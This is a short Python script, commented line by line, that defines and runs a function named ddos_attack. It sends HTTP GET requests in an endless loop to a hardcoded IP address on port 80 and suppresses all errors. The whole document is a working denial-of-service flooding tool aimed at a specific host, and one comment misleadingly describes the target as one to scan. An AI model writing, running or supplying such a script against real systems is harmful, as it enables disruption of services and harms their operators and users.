import socket # imports the socket module

target_ip = "34.135.166.24" # the target IP address to scan
target_port = 80 # the target port to scan

def ddos_attack(): # defines a function called ddos_attack  
    while True:  # creates an infinite loop
        try: # tries to execute the following code
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creates a socket object
            s.connect((target_ip, target_port)) # connects to the target IP address and port
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n") # sends a GET request to the target IP address and port
            s.close() # closes the socket object
        except: # if an exception occurs, the following code is executed
            pass # does nothing

ddos_attack() # calls the ddos_attack function
